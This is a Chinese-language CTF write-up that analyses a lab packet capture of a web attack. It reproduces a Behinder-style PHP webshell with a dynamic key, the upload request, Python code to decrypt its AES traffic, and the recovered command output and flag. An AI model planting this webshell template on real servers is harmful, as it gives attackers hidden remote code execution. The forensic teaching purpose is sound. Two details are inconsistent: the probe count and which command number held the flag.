# pcap2 · 文件上传 + 冰蝎动态密钥流量 — Writeup

> 平台：本地靶场（VMware VMnet8） · 分类：Misc / 流量分析 · 难度：★★★★☆

| 项目 | 内容 |
|---|---|
| 题目名 | pcap2（challenge2.pcapng） |
| 分类 | Misc / 流量分析（Web 攻击流量回溯） |
| 附件 | `challenge2.pcapng`，413,528 B，453 帧，86 秒 |
| 一句话 | 木马不是"固定密钥冰蝎"，而是**每次 GET 换一把随机密钥**的变种，密钥就明文写在响应里 |
| 结果 | `flag{f4bbc9d39870bc855e1172f994d0912e}` |

**最终答案**

```
flag{f4bbc9d39870bc855e1172f994d0912e}
```

## 一、题目长什么样（先建立直觉）

附件是一个 413 KB 的 pcapng，长度 453 帧、时间跨度约 86 秒，除 4 个 UDP 包外全是 TCP 80 端口流量（449 个包）。

两端很好认：`192.168.80.1`（VMware VMnet8 宿主机，攻击者）对 `192.168.80.132:80`（Ubuntu 靶机，响应头里写着 `Server: Apache/2.4.7 (Ubuntu)`）。里面出现的 User-Agent 有三种，其中 `Firefox/46.0` 是浏览器的，`Chrome/13.0.782` 那个是扫描器在伪装。

所以这是一道**"从攻击者自己的抓包里，把它的攻击链和战果复原出来"**的题，答案不是藏在文件里的字符串，而是"攻击者命令执行时打印出来的东西"。

## 二、思路总览

先给结论：这条链是「目录扫描 → 上传点 `/admin/upload.php` → 落地冰蝎马 `/images/shell.php` → `GET ?pass=` 拿随机密钥 → POST 执行命令 → `cat /flag`」。

四步链路：

1. **看分布**：把 453 帧按会话排一遍，80 端口只有 8 个客户端端口在用，其中 `36505/36506/36507` 是扫描，`36613/36616/36618/36621/36624` 是木马交互；
2. **认马**：上传的 `shell.php` 里有 `class C{public function __invoke($p){eval($p."");}}`，这是冰蝎 2.0 的 PHP 模板特征；
3. **找密钥**：这匹马开头有 `if (isset($_GET['pass']))` 分支，会 `print $key`——所以密钥不是爆破出来的，是**抓包里明文的 16 字节响应**；
4. **两层解密**：请求体 `base64(AES-128-CBC, IV=全0)` 解出 `assert|eval(base64_decode('...'))`；响应体是 `AES(json({'status':b64,'msg':b64(输出)}))`，要解两次。

## 三、逐步复现

### 3.1 第一步：把 453 帧缩成两条线

先跑协议/端口统计（`overview.py`），拿到的是：

```
packets 453   time span 86 s
ip_proto [(6, 449), (17, 4)]
top ports [(80, 449), (36613, 135), (36621, 129), (36616, 64), (36505, 31), (36507, 23), (36618, 19), (36506, 16)]
```

看到 `36613` 有 135 个包、`36621` 有 129 个包，这不是浏览器刷页面的节奏（一个 keep-alive 里塞几十个请求），而是工具在连续 POST，这一步就能定性为"有人拿 webshell 在跑命令"。

### 3.2 第二步：扫描阶段与上传点

把每个方向的 TCP 流按序号重排、按 `Content-Length` 切 HTTP 事务（`http_extract.py`），扫描段长这样：

```
GET /admin/upload.php       → 200  （168 B，gzip 压缩的 text/html）
GET /.svn/entries           → 404
GET /.git/config            → 404
GET /phpinfo.php            → 404
GET /info.php               → 404
GET /test.php               → 404
GET /i.php                  → 404
GET /phpmyadmin/index.php   → 404
```

十个探测里只有 `upload.php` 活着，这是典型的"打完字典再回头打上传点"。上传请求是真实的，逐字如下：

```
POST /admin/upload.php HTTP/1.1
Host: 192.168.80.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Referer: http://192.168.80.132/admin/upload.php
Content-Type: multipart/form-data; boundary=---------------------------157161195421310
Content-Length: 872
```

872 字节的 multipart 里，`filename="shell.php"`，文件正文 667 字节（结尾 `} ?\r\n`）。

### 3.3 第三步：把木马原样抠出来

从 multipart 中按 `Content-Type: application/octet-stream\r\n\r\n` 定界，抽到 `uploaded_shell.php`（667 字节，和现场留档完全一致）。骨架是：

```php
<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);   // 每次随机生成
    $_SESSION['k']=$key;
    print $key;                            // 直接打印给客户端
}
else
{
    $key=$_SESSION['k'];
    $post=file_get_contents("php://input");
    if(!extension_loaded('openssl')) { /* base64 + 逐字节 XOR */ }
    else { $post=openssl_decrypt($post, "AES128", $key); }
    $arr=explode('|',$post);
    class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$arr[1]);
}
?>
```

和标准冰蝎 2.0 的差别只有一处，但这一处就是本题的全部难点：**标准版把 `$key="e45e329feb5d925b"` 写死，这版改成 `substr(md5(uniqid(rand())),16)` 并 `print` 出来**。也就是说，密钥随 session 走，抓包里没有第二份副本，只能从流量里捡。

### 3.4 第四步：从 `?pass=` 的响应里捡密钥

木马连上来时先握手两次：

```
GET /images/shell.php?pass=377  → 200, body 16 B → 0dce48ce47627527
GET /images/shell.php?pass=647  → 200, body 16 B → 742e2ac07b25f020
```

两个 16 字节、全部是 `[0-9a-f]` 的响应，正是 `substr(md5(...),16)` 的产物。`?pass=377`、`?pass=647` 里的数字**不是密码**，只是"请给我一把新钥匙"的开关。

因为两次握手在同一个 PHPSESSID 里，第二次把 `$_SESSION['k']` 覆盖了，所以后面所有 POST 实际用的是 **`742e2ac07b25f020`**。这一点必须实测确认：用 `0dce48ce47627527` 解出来是乱码，用 `742e2ac07b25f020` 才对。

### 3.5 第五步：解密请求（AES-128-CBC，IV 全 0）

请求体是纯 base64 字符（无 `%`、无空格），解码后是 16 的整数倍。解密参数是这道题最容易踩空的地方：

```python
KEY = b'742e2ac07b25f020'
raw = base64.b64decode(body)          # PHP 端 openssl_decrypt 会自动解 base64
p   = AES.new(KEY, AES.MODE_CBC, b'\x00'*16).decrypt(raw)
p   = p[:-p[-1]]                      # PKCS#7
```

依据是 PHP 那句 `openssl_decrypt($post, "AES128", $key)`：`options=0` 时数据按 base64 处理、**IV 缺省为 16 个 `\x00`**、填充是 PKCS#7。解出来是：

```
assert|eval(base64_decode('QGVycm9yX3JlcG9ydGluZygwKTs...'))
```

再解一层 base64，就是冰蝎的功能模块 PHP，模块本身定义 `encrypt()` 与 `main()`，真正的动作写在末尾那一行，例如 `$cmd="ls"; main($cmd);`。

### 3.6 第六步：解密响应（要解两层，且注意 chunked）

响应是 `openssl_encrypt(json_encode(['status'=>b64,'msg'=>b64(输出)]), "AES128", $key)`，所以顺序是：AES 解密 → `json.loads` → `base64.b64decode(msg)`。

这里有个隐蔽的坑：那两个 **146 KB 的大响应是 `Transfer-Encoding: chunked`，没有 `Content-Length`**。按 `Content-Length` 切 HTTP 的脚本会把它们的 body 当成 0 字节，于是打印成 `<decrypt fail>`。补上 dechunk 之后，`36613` 那个 146,348 字节的响应用 `742e2ac07b25f020` 解出 109,748 字节，开头是：

```
{"basicInfo":"PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnN...
```

`PCFET0NUWVBF` 是 `<!DOCTYPE` 的 base64——所以这是冰蝎「基础信息」模块返回的 `basicInfo`（内含 phpinfo 那套环境页面），**不是 flag**，别在这儿耗时间。

另一个 146,412 字节的响应（客户端端口 `36621`）用两个已知密钥都解不开：它是另一个 PHP session 的连接，握手不在抓包范围内。它同样只是基础信息模块。

### 3.7 第七步：把命令序列抄下来

请求与响应按流内顺序配对，实际回显如下（均为解密后的原始内容）：

| 序号 | 客户端端口 | 命令 | 回显要点 |
|---|---|---|---|
| 1 | 36613 | `main($content)` UUID 测试 | `8e5d09af-6a97-4397-8b72-d6e139ded20d` |
| 2 | 36613 | `main()` 基础信息 | 146 KB `basicInfo` JSON |
| 3 | 36616 | `ls` | `24c.jpg Thumbs.db bg.jpg shell.php wow.jpg` |
| 4 | 36616 | `ls ../` | `1.php 1.sh admin css images index.html shell.php` |
| 5 | 36616 | `id` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 6 | 36616 | `ls /` | 根目录里出现 `flag` |
| 7 | 36616 | **`cat /flag`** | **`flag{f4bbc9d39870bc855e1172f994d0912e}`** |
| 8 | 36616 | `whoami` | `www-data` |
| 9 | 36618 | `ls -l` | `shell.php 667 字节 www-data Dec 15 22:22` |
| 10 | 36624 | `ls` | 与第 3 条相同 |

第 9 条的 `ls -l` 是**证据闭环**：`-rw-r--r-- 1 www-data www-data 667 Dec 15 22:22 shell.php`，667 字节正好等于第 3.3 步抠出来的木马大小，说明上传确实落地成功，而不是上传失败后另有路径。

## 四、关键知识点

| 概念 | 是什么 | 这题为什么用它 | 以后在哪还会遇到 |
|---|---|---|---|
| 冰蝎 2.0 特征 | `explode('|')` + `class C{__invoke}` + `openssl_decrypt(...,"AES128",...)` | 用来一眼认出"这是加密马而不是菜刀" | 任何 webshell 流量题的身份判定 |
| 动态密钥变种 | 用 `?pass=` 触发 `md5(uniqid(rand()))` 并 `print` | 让固定 key 字典彻底失效，逼你回到流量里找 | 免杀马、内存马、定制 C2 |
| PHP `openssl_decrypt` 默认值 | `options=0` → 数据按 base64、IV=全 0、PKCS#7 | 少一个参数就是满屏乱码 | 所有 PHP 加密马解密 |
| 响应双层封装 | 第一层 AES，第二层 JSON+base64 | 只解一层会得到"看起来像 flag 的 base64" | 冰蝎/哥斯拉/自定义 C2 |
| chunked 响应 | 无 `Content-Length`，靠 `size\r\n...` 分块 | 漏了它，146 KB 的响应会变成 0 字节 | 任何按 CL 切 HTTP 的脚本 |

## 五、踩坑与陷阱

1. **把 `?pass=377` 当密码去算 `md5("377")`**。这题里 `pass` 的值（377/647）完全不参与密钥推导，参与推导的是 `uniqid(rand())`。
2. **用第一把钥匙**。两把钥匙都打印在响应里，但 session 只留最后一把；实测第一把解出来是乱码。
3. **body 长度算错**。最开始把 1112 字符的 base64 按 `1112*3/4=834` 估，得到"不是 16 的倍数"，误判成"提取不完整"；实际去掉 padding 后是 832 字节，正好 52 个块。
4. **按 ECB 猜**。请求前 16 字节密文完全相同，看着像 ECB，实际是固定 IV 的 CBC；`func|params` 的第一块明文相同，CBC+零 IV 也会给出相同首块。
5. **大响应误判成 flag**。146 KB 的响应解出来是 `basicInfo`（phpinfo 环境信息），真正的大响应是"信息收集"模块的产物，不是战果。
6. **忽略 chunked**。`decrypt3.py` 里 flow 1 第二条 POST 打出 `<decrypt fail>`，不是密钥错，是响应体没被切出来。

## 六、赛场 20 分钟行动清单

1. `overview.py` 跑端口/会话统计，看有没有单个客户端端口塞了几十个请求（工具特征）。
2. 找上传点：`http.request.method == "POST"` + `multipart/form-data`，直接把文件正文抽出来存盘。
3. 读木头文件：出现 `class C{__invoke}` / `openssl_decrypt(...,"AES128",...)` 就按冰蝎处理。
4. 找 `GET ...?pass=`，把紧随其后的 16 字节响应当密钥（多个就都记下来）。
5. 先拿一条小请求试解密，参数对不上就换 ECB/CBC/IV 组合，别一上来批量跑。
6. 命令表里优先看 `cat`、`type`、`more`，其次看 `ls /`。
   > 超过 25 分钟还在纠结解密参数，就先去看响应体里有没有明文（有的马只加密请求）。

## 七、附件与脚本

现场目录 `D:\XiaoMibook\CTF学习\pcap2\`：

| 文件 | 作用 |
|---|---|
| `challenge2.pcapng` | 原始抓包（453 帧） |
| `overview.py` | 纯 Python pcapng 解析 + 协议统计，`python overview.py challenge2.pcapng` |
| `http_extract.py` | 按 TCP 序号重排 + 按 `Content-Length` 切 HTTP 事务 |
| `extract_shell.py` | 从 multipart 里抽 `shell.php`（产出 667 字节） |
| `uploaded_shell.php` | 抽出来的木马原文 |
| `decrypt3.py` | 请求/响应成对解密并打印命令回显 |
| `strings_all.txt` | 全量 strings，人工翻查用 |

复现要点：

```powershell
cd D:\XiaoMibook\CTF学习\pcap2
python overview.py challenge2.pcapng
python http_extract.py challenge2.pcapng
python decrypt3.py            # 固定读当前目录的 challenge2.pcapng
```

两个提醒：`decrypt3.py` 在回显超过 700 字节时会往**当前目录**写 `out_*.txt`，别在原始附件目录里直接跑；它对 chunked 响应会失配，想拿到 146 KB 那份 `basicInfo` 需要自己补 dechunk。

flag 来自第 10 条命令 `cat /flag` 的解密回显，是这一次抓包对应的靶机值；靶机重建后 flag 会变，但攻击链与密钥获取方式不变。
